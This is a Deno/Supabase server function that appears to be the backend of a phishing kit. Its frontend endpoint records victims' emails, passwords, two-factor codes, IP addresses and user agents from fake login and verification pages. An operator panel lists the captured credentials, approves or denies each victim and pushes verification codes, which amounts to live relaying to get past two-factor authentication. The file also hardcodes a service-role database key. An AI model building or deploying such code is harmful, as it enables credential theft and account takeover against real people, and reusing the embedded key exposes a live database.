import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS'
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  try {
    const supabaseClient = createClient(
      'https://nqsdardermkzppeaazbb.supabase.co', 
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MDk1NjU2NSwiZXhwIjoyMDY2NTMyNTY1fQ._G6ZV0GjtQ7Q8ZV4GKOFDxKGhi_eQl2VP7eYfaf-GE8'
    );

    const url = new URL(req.url);
    let path = url.pathname;
    
    // Remove function name from path for proper routing
    // Supabase sends: /admin-api/api/request -> we want: /api/request
    if (path.startsWith('/admin-api')) {
      path = path.replace('/admin-api', '');
    }
    
    console.log('Original path:', url.pathname, '-> Processed path:', path);

    // ROOT endpoint - Test if function is working
    if (path === '/' && req.method === 'GET') {
      return new Response(JSON.stringify({
        message: 'ADMIN API WORKING! 🚀',
        timestamp: new Date().toISOString(),
        success: true,
        version: '1.1-FIXED',
        original_path: url.pathname,
        processed_path: path,
        endpoints: [
          'GET /api/pending - Get all pending requests',
          'POST /api/approve - Approve/deny request', 
          'POST /api/delete - Delete request',
          'POST /api/set-verification-code - Set verification code',
          'POST /api/request - Submit login request',
          'GET /api/check-approval - Check approval status'
        ]
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // ===== ADMIN GUI ENDPOINTS =====
    
    // Get all pending requests (Admin GUI calls this)
    if (path === '/api/pending' && req.method === 'GET') {
      console.log('Fetching pending requests...');
      
      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) {
        console.error('Fetch requests error:', error);
        return new Response(JSON.stringify({ error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        });
      }

      // Transform data to match local server format
      const transformedData = data?.map(req => ({
        id: req.id,
        email: req.email || 'undefined',
        password: req.password || 'undefined',
        twofa: req.twofa || 'undefined',
        userAgent: req.user_agent || 'undefined',
        ip: req.ip || 'undefined',
        country: req.country || 'undefined',
        status: req.status || 'pending',
        pageStatus: req.page_status || 'Login',
        verificationCode: req.verification_code,
        createdAt: new Date(req.created_at).getTime(),
        approvedAt: req.approved_at ? new Date(req.approved_at).getTime() : undefined
      })) || [];

      console.log(`Found ${transformedData.length} requests`);
      return new Response(JSON.stringify(transformedData), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // Approve/deny request (Admin GUI calls this)
    if (path === '/api/approve' && req.method === 'POST') {
      const body = await req.json();
      const { id, decision, verificationCode } = body;
      
      console.log('Approving request:', { id, decision, verificationCode });

      const { data, error } = await supabaseClient
        .from('requests')
        .update({
          status: decision,
          verification_code: verificationCode || null,
          approved_at: decision === 'approved' ? new Date().toISOString() : null
        })
        .eq('id', id)
        .select();

      if (error) {
        console.error('Approve request error:', error);
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        });
      }

      console.log('Request approved successfully:', data);
      return new Response(JSON.stringify({ success: true, data }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // Delete request (Admin GUI calls this)
    if (path === '/api/delete' && req.method === 'POST') {
      const body = await req.json();
      const { id } = body;
      
      console.log('Deleting request:', id);

      const { data, error } = await supabaseClient
        .from('requests')
        .delete()
        .eq('id', id)
        .select();

      if (error) {
        console.error('Delete request error:', error);
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        });
      }

      console.log('Request deleted successfully:', data);
      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // Set verification code (Admin GUI calls this)
    if (path === '/api/set-verification-code' && req.method === 'POST') {
      const body = await req.json();
      const { email, code } = body;

      if (!email || !code) {
        return new Response(JSON.stringify({ success: false, message: 'Missing email or code' }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        });
      }

      console.log('Setting verification code:', { email, code });

      // Find latest request for this email and update verification code
      const { data: requests, error: fetchError } = await supabaseClient
        .from('requests')
        .select('*')
        .eq('email', email)
        .order('created_at', { ascending: false })
        .limit(1);

      if (fetchError) {
        console.error('Fetch request error:', fetchError);
        return new Response(JSON.stringify({ success: false, error: fetchError.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        });
      }

      if (!requests || requests.length === 0) {
        return new Response(JSON.stringify({ success: false, message: 'Request not found for this email' }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404
        });
      }

      const { data, error } = await supabaseClient
        .from('requests')
        .update({ verification_code: code })
        .eq('id', requests[0].id)
        .select();

      if (error) {
        console.error('Update verification code error:', error);
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        });
      }

      console.log('Verification code updated successfully:', data);
      return new Response(JSON.stringify({ success: true, message: 'Verification code updated', code }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // ===== FRONTEND ENDPOINTS =====
    
    // Submit login request (Frontend calls this)
    if (path === '/api/request' && req.method === 'POST') {
      const body = await req.json();
      const { email, password, twofa, userAgent, currentPage } = body;

      console.log('Submitting request:', { email, currentPage });

      // Determine page status
      let pageStatus = 'Login';
      switch(currentPage) {
        case 'index.html': pageStatus = 'Login'; break;
        case 'password.html': pageStatus = 'Password'; break;
        case 'verify-device.html': pageStatus = 'Setup Code Phone'; break;
        case 'verify-options.html': pageStatus = 'Wait Options'; break;
        case 'verify.html': pageStatus = '2FA'; break;
        case 'verify-notification.html': pageStatus = 'Waiting Finish'; break;
        default: pageStatus = 'Login';
      }

      const { data, error } = await supabaseClient
        .from('requests')
        .insert([{
          email: email || 'undefined',
          password: password || 'undefined',
          twofa: twofa || 'undefined',
          user_agent: userAgent || 'undefined',
          ip: req.headers.get('x-forwarded-for') || 'unknown',
          country: 'Unknown',
          page_status: pageStatus,
          status: 'pending'
        }])
        .select();

      if (error) {
        console.error('Insert request error:', error);
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        });
      }

      console.log('Request inserted successfully:', data);
      return new Response(JSON.stringify({ requestId: data[0].id }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // Check approval status by email (Frontend calls this)
    if (path === '/api/check-approval' && req.method === 'GET') {
      const email = url.searchParams.get('email');
      
      if (!email) {
        return new Response(JSON.stringify({ error: 'Email parameter required' }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        });
      }

      console.log('Checking approval for email:', email);

      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .eq('email', email)
        .order('created_at', { ascending: false })
        .limit(1);

      if (error) {
        console.error('Check approval error:', error);
        return new Response(JSON.stringify({ error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500
        });
      }

      const request = data?.[0];
      console.log('Approval status:', request?.status || 'not_found');

      return new Response(JSON.stringify({
        status: request?.status || 'not_found',
        verificationCode: request?.verification_code,
        id: request?.id
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // 404 for unknown endpoints
    return new Response(JSON.stringify({
      error: 'Endpoint Not Found',
      original_path: url.pathname,
      processed_path: path,
      method: req.method,
      available_endpoints: [
        'GET / - Function status',
        'GET /api/pending - Get all pending requests',
        'POST /api/approve - Approve/deny request',
        'POST /api/delete - Delete request',
        'POST /api/set-verification-code - Set verification code',
        'POST /api/request - Submit login request',
        'GET /api/check-approval - Check approval status'
      ]
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 404
    });

  } catch (error) {
    console.error('Unexpected error:', error);
    return new Response(JSON.stringify({
      error: 'Internal Server Error',
      message: error.message
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500
    });
  }
}); 